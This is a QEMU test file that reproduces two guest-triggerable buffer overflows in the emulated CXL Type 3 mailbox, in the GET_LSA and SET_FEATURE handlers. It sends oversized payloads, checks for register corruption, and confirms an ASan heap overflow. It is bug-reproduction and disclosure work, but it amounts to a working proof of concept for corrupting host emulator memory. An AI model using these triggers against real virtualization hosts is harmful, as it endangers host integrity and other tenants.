/*
 * QTest: CXL Type 3 mailbox bounds-check tests
 *
 * Bug 1: cmd_ccls_get_lsa copies guest-controlled length into 2048-byte
 *         payload buffer without checking against buffer size.
 * Bug 2: cmd_features_set_feature missing bounds checks on 6 UUID branches
 *         (soft_ppr, hard_ppr, cacheline/row/bank/rank_sparing).
 */
#include "qemu/osdep.h"
#include <glib/gstdio.h>
#include "libqtest.h"

#define MMCFG_BASE  0xb0000000ULL

#define MBOX_CAP    0x00
#define MBOX_CTRL   0x04
#define MBOX_CMD    0x08
#define MBOX_STS    0x10
#define MBOX_PL     0x20

#define CCLS            0x41
#define GET_LSA         0x02
#define FEATURES        0x05
#define SET_FEATURE     0x02

#define CXL_MBOX_SUCCESS                    0x00
#define CXL_MBOX_INVALID_PAYLOAD_LENGTH     0x16

#define SET_FEAT_FULL_TRANSFER  0x00
#define SET_FEAT_HDR_SIZE       32

typedef struct {
    const char *name;
    uint8_t uuid[16];
    uint8_t version;
    int line;
} VulnFeature;

/* 6 branches missing the bounds check present in patrol_scrub/ecs */
static const VulnFeature vuln_features[] = {
    { "soft_ppr", {
        0x89, 0x2b, 0xa4, 0x75, 0xfa, 0xd8, 0x47, 0x4e,
        0x9d, 0x3e, 0x69, 0x2c, 0x91, 0x75, 0x68, 0xbb },
      0x03, 1816 },
    { "hard_ppr", {
        0x80, 0xea, 0x45, 0x21, 0x78, 0x6f, 0x41, 0x27,
        0xaf, 0xb1, 0xec, 0x74, 0x59, 0xfb, 0x0e, 0x24 },
      0x03, 1835 },
    { "cacheline_sparing", {
        0x96, 0xC3, 0x33, 0x86, 0x91, 0xdd, 0x44, 0xc7,
        0x9e, 0xcb, 0xfd, 0xaf, 0x65, 0x03, 0xba, 0xc4 },
      0x01, 1854 },
    { "row_sparing", {
        0x45, 0x0e, 0xbf, 0x67, 0xb1, 0x35, 0x4f, 0x97,
        0xa4, 0x98, 0xc2, 0xd5, 0x7f, 0x27, 0x9b, 0xed },
      0x01, 1872 },
    { "bank_sparing", {
        0x78, 0xb7, 0x96, 0x36, 0x90, 0xac, 0x4b, 0x64,
        0xa4, 0xef, 0xfa, 0xac, 0x5d, 0x18, 0xa8, 0x63 },
      0x01, 1890 },
    { "rank_sparing", {
        0x34, 0xdb, 0xaf, 0xf5, 0x05, 0x52, 0x42, 0x81,
        0x8f, 0x76, 0xda, 0x0b, 0x5e, 0x7a, 0x76, 0xa7 },
      0x01, 1908 },
};
#define N_VULN_FEATURES (sizeof(vuln_features) / sizeof(vuln_features[0]))

/* Control: patrol_scrub HAS the bounds check */
static const uint8_t PATROL_SCRUB_UUID[16] = {
    0x96, 0xda, 0xd7, 0xd6, 0xfd, 0xe8, 0x48, 0x2b,
    0xa7, 0x33, 0x75, 0x77, 0x4e, 0x06, 0xdb, 0x8a
};

static uint64_t mcfg(int bus, int dev, int fn, int reg)
{
    return MMCFG_BASE | ((uint64_t)bus << 20) | ((uint64_t)dev << 15)
                     | ((uint64_t)fn << 12) | (uint64_t)reg;
}

/*
 * Program PCI bridge chain and BAR2 for cxl-type3.
 * qtest has no firmware so MMCFG and bridges need manual setup.
 */
static void program_bridges_and_bar(QTestState *qts, uint32_t bar2_addr)
{
    /* Enable MMCFG (PCIEXBAR) — disabled by default without firmware */
    qtest_outl(qts, 0xcf8, 0x80000000 | 0x60);
    qtest_outl(qts, 0xcfc, 0xb0000001);

    /* pxb-cxl (bus 0, dev 1): MEM|IO|BusMaster, bus 0x34-0x35 */
    qtest_outl(qts, 0xcf8, 0x80000000 | (1u << 11) | 0x04);
    qtest_outw(qts, 0xcfc, 0x0007);
    qtest_outl(qts, 0xcf8, 0x80000000 | (1u << 11) | 0x18);
    qtest_outl(qts, 0xcfc, 0x00353400);
    qtest_outl(qts, 0xcf8, 0x80000000 | (1u << 11) | 0x20);
    qtest_outl(qts, 0xcfc, 0xfe6ffe60);

    /* cxl-rp (bus 0x34, dev 0) */
    qtest_writel(qts, mcfg(0x34, 0, 0, 0x18), 0x00353534);
    qtest_writel(qts, mcfg(0x34, 0, 0, 0x20), 0xfe6ffe60);
    qtest_writew(qts, mcfg(0x34, 0, 0, 0x04), 0x0007);

    /* cxl-type3 (bus 0x35, dev 0): BAR2, enable MEM */
    qtest_writel(qts, mcfg(0x35, 0, 0, 0x18), bar2_addr | 0x4);
    qtest_writel(qts, mcfg(0x35, 0, 0, 0x1c), 0);
    qtest_writew(qts, mcfg(0x35, 0, 0, 0x04), 0x0006);
}

/* Find a named MemoryRegion's GPA in `info mtree -f` output */
static uint64_t find_mr_in_mtree(const char *mtree, const char *name)
{
    const char *p = mtree;
    size_t namelen = strlen(name);

    while ((p = strstr(p, ": ")) != NULL) {
        const char *region = p + 2;
        if (strncmp(region, name, namelen) == 0) {
            char term = region[namelen];
            if (term == '\r' || term == '\n' || term == '\0' ||
                (term == ' ' && region[namelen + 1] == '@')) {
                const char *ls = p;
                while (ls > mtree && ls[-1] != '\n' && ls[-1] != '\r') {
                    ls--;
                }
                while (*ls == ' ' || *ls == '\t') {
                    ls++;
                }
                return (uint64_t)g_ascii_strtoull(ls, NULL, 16);
            }
        }
        p += 2;
    }
    return 0;
}

/* Send a CXL mailbox command; returns len_out (20-bit) */
static uint64_t cxl_mbox_send(QTestState *qts, uint64_t mbox_gpa,
                               uint8_t set, uint8_t cmd,
                               const void *pl_in, size_t pl_len,
                               uint32_t *out_errno)
{
    uint64_t pl_addr = mbox_gpa + MBOX_PL;

    for (size_t i = 0; i < pl_len; i += 4) {
        uint32_t val = 0;
        memcpy(&val, (const uint8_t *)pl_in + i,
               (pl_len - i >= 4) ? 4 : pl_len - i);
        qtest_writel(qts, pl_addr + i, val);
    }

    uint64_t cmd_reg = (uint64_t)cmd | ((uint64_t)set << 8) |
                       ((uint64_t)pl_len << 16);
    qtest_writeq(qts, mbox_gpa + MBOX_CMD, cmd_reg);
    qtest_writel(qts, mbox_gpa + MBOX_CTRL, 0x1);

    uint64_t sts = qtest_readq(qts, mbox_gpa + MBOX_STS);
    uint64_t cmd_out = qtest_readq(qts, mbox_gpa + MBOX_CMD);
    if (out_errno) {
        *out_errno = (sts >> 32) & 0xFFFF;
    }
    return (cmd_out >> 16) & 0xFFFFF;
}

static uint8_t *build_set_feature_hdr(uint8_t *buf, const uint8_t *uuid,
                                       uint32_t flags, uint16_t offset,
                                       uint8_t version)
{
    memset(buf, 0, SET_FEAT_HDR_SIZE);
    memcpy(buf + 0, uuid, 16);
    memcpy(buf + 16, &flags, 4);
    memcpy(buf + 20, &offset, 2);
    buf[22] = version;
    return buf + SET_FEAT_HDR_SIZE;
}

/* --- Test fixture --- */

typedef struct {
    QTestState *qts;
    uint64_t mbox_gpa;
    uint64_t memdev_gpa;
    char *lsa_path;
} CxlTestState;

static CxlTestState *cxl_test_start(bool need_lsa)
{
    CxlTestState *s = g_new0(CxlTestState, 1);
    g_autofree char *mtree = NULL;

    if (need_lsa) {
        int lsa_fd = g_file_open_tmp("qtest-cxl-mbox-XXXXXX", &s->lsa_path,
                                      NULL);
        g_assert(lsa_fd >= 0);
        uint8_t *pattern = g_malloc(1024 * 1024);
        memset(pattern, 0xAA, 1024 * 1024);
        g_assert_cmpint(write(lsa_fd, pattern, 1024 * 1024), ==, 1024 * 1024);
        g_free(pattern);
        close(lsa_fd);

        s->qts = qtest_initf(
            "-machine q35,cxl=on -m 2G "
            "-object memory-backend-file,id=cxl-lsa,mem-path=%s,size=1M "
            "-object memory-backend-ram,id=cxl-mem,size=256M "
            "-device pxb-cxl,bus_nr=0x34,bus=pcie.0,id=cxl.0 "
            "-M cxl-fmw.0.targets.0=cxl.0,cxl-fmw.0.size=4G "
            "-device cxl-rp,bus=cxl.0,id=cxl-rp0,chassis=0,slot=0 "
            "-device cxl-type3,bus=cxl-rp0,persistent-memdev=cxl-mem,"
            "lsa=cxl-lsa,id=cxl-pmem0",
            s->lsa_path);
    } else {
        s->qts = qtest_initf(
            "-machine q35,cxl=on -m 2G "
            "-object memory-backend-ram,id=cxl-mem,size=256M "
            "-device pxb-cxl,bus_nr=0x34,bus=pcie.0,id=cxl.0 "
            "-M cxl-fmw.0.targets.0=cxl.0,cxl-fmw.0.size=4G "
            "-device cxl-rp,bus=cxl.0,id=cxl-rp0,chassis=0,slot=0 "
            "-device cxl-type3,bus=cxl-rp0,volatile-memdev=cxl-mem,"
            "id=cxl-vmem0");
    }

    program_bridges_and_bar(s->qts, 0xfe610000);

    mtree = qtest_hmp(s->qts, "info mtree -f");
    s->mbox_gpa = find_mr_in_mtree(mtree, "mailbox");
    s->memdev_gpa = find_mr_in_mtree(mtree, "memory device caps");
    g_assert_cmpuint(s->mbox_gpa, !=, 0);
    g_assert_cmphex(qtest_readw(s->qts, mcfg(0x35, 0, 0, 0x00)), ==, 0x8086);

    return s;
}

static void cxl_test_end(CxlTestState *s)
{
    qtest_quit(s->qts);
    if (s->lsa_path) {
        unlink(s->lsa_path);
        g_free(s->lsa_path);
    }
    g_free(s);
}

/*
 * Bug 1: cmd_ccls_get_lsa — length not checked against payload buffer size.
 * Request 4096 bytes into the 2048-byte buffer; verify rc=0 and corruption.
 */
static void test_cxl_lsa_overflow(void)
{
    CxlTestState *s = cxl_test_start(true);

    uint64_t memdev_before = qtest_readq(s->qts, s->memdev_gpa);
    g_test_message("memdev_status before = 0x%016" PRIx64, memdev_before);

    struct {
        uint32_t offset;
        uint32_t length;
    } QEMU_PACKED get_lsa_in = { .offset = 0, .length = 4096 };

    uint32_t rc;
    uint64_t len_out = cxl_mbox_send(s->qts, s->mbox_gpa,
                                      CCLS, GET_LSA,
                                      &get_lsa_in, 8, &rc);

    g_test_message("rc=%u len_out=%" PRIu64, rc, len_out);
    g_assert_cmphex(rc, ==, CXL_MBOX_SUCCESS);
    g_assert_cmpuint(len_out, ==, 4096);

    uint64_t memdev_after = qtest_readq(s->qts, s->memdev_gpa);
    g_test_message("memdev_status after = 0x%016" PRIx64, memdev_after);
    if (memdev_after != memdev_before) {
        g_test_message("CORRUPTION: adjacent register overwritten by LSA data");
    }

    /* 1MB variant — stays intra-object so ASan won't catch it */
    get_lsa_in.length = 0x100000;
    cxl_mbox_send(s->qts, s->mbox_gpa, CCLS, GET_LSA,
                   &get_lsa_in, 8, &rc);
    g_assert_cmphex(rc, ==, CXL_MBOX_SUCCESS);

    cxl_test_end(s);
}

/*
 * Bug 2: cmd_features_set_feature — 6 branches lack bounds check.
 * Send 512-byte payload into each 2-3 byte target; all return SUCCESS.
 * patrol_scrub (which has the check) rejects the same payload.
 */
static void test_cxl_set_feature_overflow(void)
{
    CxlTestState *s = cxl_test_start(false);
    uint32_t rc;

    for (size_t i = 0; i < N_VULN_FEATURES; i++) {
        const VulnFeature *vf = &vuln_features[i];
        uint8_t payload[544];

        build_set_feature_hdr(payload, vf->uuid,
                              SET_FEAT_FULL_TRANSFER, 0, vf->version);
        memset(payload + SET_FEAT_HDR_SIZE, 0xCC,
               sizeof(payload) - SET_FEAT_HDR_SIZE);

        cxl_mbox_send(s->qts, s->mbox_gpa, FEATURES, SET_FEATURE,
                       payload, sizeof(payload), &rc);
        g_test_message("%s: rc=%u (no bounds check)", vf->name, rc);
        g_assert_cmphex(rc, ==, CXL_MBOX_SUCCESS);
    }

    /* Control: patrol_scrub rejects */
    {
        uint8_t payload[544];
        build_set_feature_hdr(payload, PATROL_SCRUB_UUID,
                              SET_FEAT_FULL_TRANSFER, 0, 0x01);
        memset(payload + SET_FEAT_HDR_SIZE, 0xCC,
               sizeof(payload) - SET_FEAT_HDR_SIZE);

        cxl_mbox_send(s->qts, s->mbox_gpa, FEATURES, SET_FEATURE,
                       payload, sizeof(payload), &rc);
        g_test_message("patrol_scrub: rc=%u (has bounds check)", rc);
        g_assert_cmphex(rc, ==, CXL_MBOX_INVALID_PAYLOAD_LENGTH);
    }

    cxl_test_end(s);
}

/*
 * Bug 2 + ASan: offset=0x1000 pushes memcpy past the end of the
 * CXLType3Dev allocation. ASan catches the out-of-bounds write.
 */
static void test_cxl_set_feature_overflow_asan(void)
{
    CxlTestState *s = cxl_test_start(false);
    uint32_t rc;

    uint8_t payload[544];
    build_set_feature_hdr(payload, vuln_features[0].uuid,
                           SET_FEAT_FULL_TRANSFER, 0x1000,
                           vuln_features[0].version);
    memset(payload + SET_FEAT_HDR_SIZE, 0xDD,
           sizeof(payload) - SET_FEAT_HDR_SIZE);

    if (g_test_subprocess()) {
        cxl_mbox_send(s->qts, s->mbox_gpa, FEATURES, SET_FEATURE,
                       payload, sizeof(payload), &rc);
        g_assert_cmphex(rc, ==, CXL_MBOX_SUCCESS);
        cxl_test_end(s);
        return;
    }

    cxl_test_end(s);

    g_test_trap_subprocess(NULL, 30 * G_USEC_PER_SEC,
                           G_TEST_SUBPROCESS_INHERIT_STDERR);

    if (!g_test_trap_has_passed()) {
        g_test_trap_assert_stderr("*heap-buffer-overflow*");
        g_test_message("ASan confirmed heap-buffer-overflow");
    }
}

int main(int argc, char **argv)
{
    g_test_init(&argc, &argv, NULL);
    qtest_add_func("/x86_64/cxl/lsa-bounds-check", test_cxl_lsa_overflow);
    qtest_add_func("/x86_64/cxl/set-feature-overflow",
                   test_cxl_set_feature_overflow);
    qtest_add_func("/x86_64/cxl/set-feature-overflow-asan",
                   test_cxl_set_feature_overflow_asan);
    return g_test_run();
}